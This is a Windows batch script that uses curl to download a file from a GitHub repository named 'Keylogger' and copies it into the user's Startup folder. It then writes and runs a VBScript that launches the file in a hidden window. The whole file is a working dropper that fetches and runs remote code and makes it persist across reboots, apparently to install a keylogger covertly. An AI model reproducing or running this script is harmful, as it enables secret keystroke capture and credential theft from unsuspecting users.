@echo off
REM You can add your own if you like, this just downloads it and puts it into a batch file and then puts it in the startup folder
set url=https://raw.githubusercontent.com/iMakeStuff69420/Keylogger/main/Script
set outputFile=script.bat
set vbsScript=run.vbs
set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

curl -o %outputFile% %url%
copy %outputFile% %startupFolder%
echo Set objShell = WScript.CreateObject("WScript.Shell") > %startupFolder%\%vbsScript%
echo objShell.Run "%startupFolder%\%outputFile%", 0, True >> %startupFolder%\%vbsScript%

cscript /nologo %startupFolder%\%vbsScript%
